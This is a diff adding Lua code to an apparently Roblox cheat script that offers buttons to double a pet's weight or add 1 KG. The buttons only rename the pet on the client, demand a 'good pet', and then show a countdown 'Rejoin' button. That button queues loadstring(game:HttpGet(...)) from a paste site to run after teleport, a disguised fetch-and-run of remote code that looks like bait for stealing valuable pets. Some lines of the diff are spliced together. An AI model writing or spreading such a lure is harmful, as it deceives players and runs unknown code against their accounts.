@@ -285,6 +285,181 @@ RunService.RenderStepped:Connect(function()
     else
         petInfo.Text = "Please hold your pet..."
     end
+end)petInfo.TextWrapped = true
+
+-- Nút tăng gấp đôi
+local doubleButton = Instance.new("TextButton", frame)
+doubleButton.Text = "Increase Pet Weight x2"
+doubleButton.Font = Enum.Font.FredokaOne
+doubleButton.TextSize = 16
+doubleButton.TextColor3 = Color3.fromRGB(40, 40, 40)
+doubleButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+doubleButton.Size = UDim2.new(0, 220, 0, 34)
+doubleButton.Position = UDim2.new(0.5, -110, 0, 80)
+Instance.new("UICorner", doubleButton)
+
+-- Nút tăng 1kg
+local plusOneButton = Instance.new("TextButton", frame)
+plusOneButton.Text = "Increase Pet Weight +1 KG"
+plusOneButton.Font = Enum.Font.FredokaOne
+plusOneButton.TextSize = 16
+plusOneButton.TextColor3 = Color3.fromRGB(40, 40, 40)
+plusOneButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+plusOneButton.Size = UDim2.new(0, 220, 0, 34)
+plusOneButton.Position = UDim2.new(0.5, -110, 0, 124)
+Instance.new("UICorner", plusOneButton)
+
+-- Footer
+local footer = Instance.new("TextLabel", frame)
+footer.Text = "Script by PhatLee"
+footer.Font = Enum.Font.FredokaOne
+footer.TextSize = 14
+footer.TextColor3 = Color3.fromRGB(80, 80, 80)
+footer.BackgroundTransparency = 1
+footer.Size = UDim2.new(1, 0, 0, 20)
+footer.Position = UDim2.new(0, 0, 1, -22)
+
+-- GUI cảnh báo
+local function showWarning(msg)
+    local warnGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+    warnGui.Name = "WarningGUI"
+    local warnFrame = Instance.new("Frame", warnGui)
+    warnFrame.Size = UDim2.new(0, 300, 0, 100)
+    warnFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
+    warnFrame.BackgroundColor3 = Color3.fromRGB(255, 200, 200)
+    Instance.new("UICorner", warnFrame)
+
+    local warnText = Instance.new("TextLabel", warnFrame)
+    warnText.Size = UDim2.new(1, -20, 1, -20)
+    warnText.Position = UDim2.new(0, 10, 0, 10)
+    warnText.BackgroundTransparency = 1
+    warnText.Text = msg
+    warnText.TextColor3 = Color3.fromRGB(100, 0, 0)
+    warnText.TextSize = 16
+    warnText.TextWrapped = true
+    warnText.Font = Enum.Font.FredokaOne
+end
+
+-- GUI rejoin
+local function showRejoinGUI()
+    local rejoinGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+    rejoinGui.Name = "RejoinGUI"
+    local rFrame = Instance.new("Frame", rejoinGui)
+    rFrame.Size = UDim2.new(0, 260, 0, 140)
+    rFrame.Position = UDim2.new(0.5, -130, 0.5, -70)
+    rFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Instance.new("UICorner", rFrame)
+
+    local closeBtn = Instance.new("TextButton", rFrame)
+    closeBtn.Text = "X"
+    closeBtn.Font = Enum.Font.FredokaOne
+    closeBtn.TextSize = 16
+    closeBtn.Size = UDim2.new(0, 30, 0, 30)
+    closeBtn.Position = UDim2.new(1, -35, 0, 5)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 150)
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Instance.new("UICorner", closeBtn)
+    closeBtn.MouseButton1Click:Connect(function()
+        rejoinGui:Destroy()
+    end)
+
+    local info = Instance.new("TextLabel", rFrame)
+    info.Text = "Rejoin to see your pet"
+    info.Font = Enum.Font.FredokaOne
+    info.TextSize = 18
+    info.TextColor3 = Color3.fromRGB(40, 40, 40)
+    info.Size = UDim2.new(1, 0, 0, 40)
+    info.Position = UDim2.new(0, 0, 0, 40)
+    info.BackgroundTransparency = 1
+
+    local rejoinBtn = Instance.new("TextButton", rFrame)
+    rejoinBtn.Font = Enum.Font.FredokaOne
+    rejoinBtn.TextSize = 16
+    rejoinBtn.TextColor3 = Color3.fromRGB(40, 40, 40)
+    rejoinBtn.BackgroundColor3 = Color3.fromRGB(200, 255, 200)
+    rejoinBtn.Size = UDim2.new(0, 200, 0, 34)
+    rejoinBtn.Position = UDim2.new(0.5, -100, 1, -50)
+    Instance.new("UICorner", rejoinBtn)
+
+    local countdown = 30
+    local function updateBtn()
+        rejoinBtn.Text = "Rejoin (" .. countdown .. "s)"
+    end
+    updateBtn()
+
+    task.spawn(function()
+        while countdown > 0 do
+            task.wait(1)
+            countdown -= 1
+            updateBtn()
+        end
+        rejoinBtn.Text = "Rejoin Now"
+        rejoinBtn.MouseButton1Click:Connect(function()
+            queue_on_teleport('loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()')
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+        end)
+    end)
+end
+
+-- Logic tăng weight
+local function increaseWeight(multiplier)
+    local tool = getEquippedPetTool()
+    if tool then
+        if not isGoodPet(tool.Name) then
+            showWarning("This only works with good pet.\nPlease use an account with good pet.")
+            return
+        end
+        local kg = parsePetKG(tool.Name)
+        if kg then
+            local newKG = kg * multiplier
+            setPetName(tool, newKG)
+            petInfo.Text = "Equipped Pet: " .. tool.Name
+            showRejoinGUI()
+        else
+            petInfo.Text = "Invalid Pet Format!"
+        end
+    else
+        petInfo.Text = "No Pet Equipped!"
+    end
+end
+
+local function increaseWeightBy(amount)
+    local tool = getEquippedPetTool()
+    if tool then
+        if not isGoodPet(tool.Name) then
+            showWarning("This only works with good pet.\nPlease use an account with good pet.")
+            return
+        end
+        local kg = parsePetKG(tool.Name)
+        if kg then
+            local newKG = kg + amount
+            setPetName(tool, newKG)
+            petInfo.Text = "Equipped Pet: " .. tool.Name
+            showRejoinGUI()
+        else
+            petInfo.Text = "Invalid Pet Format!"
+        end
+    else
+        petInfo.Text = "No Pet Equipped!"
+    end
+end
+
+-- Gán sự kiện
+doubleButton.MouseButton1Click:Connect(function()
+    increaseWeight(2)
+end)
+plusOneButton.MouseButton1Click:Connect(function()
+    increaseWeightBy(1)
+end)
+
+-- Cập nhật pet info
+RunService.RenderStepped:Connect(function()
+    local tool = getEquippedPetTool()
+    if tool then
+        petInfo.Text = "Equipped Pet: " .. tool.Name
+    else
+        petInfo.Text = "Please hold your pet..."
+    end
 end)	f.Position = UDim2.new(0.5, -230, 0.35, 0)
 	f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 	f.BackgroundTransparency = 0.3
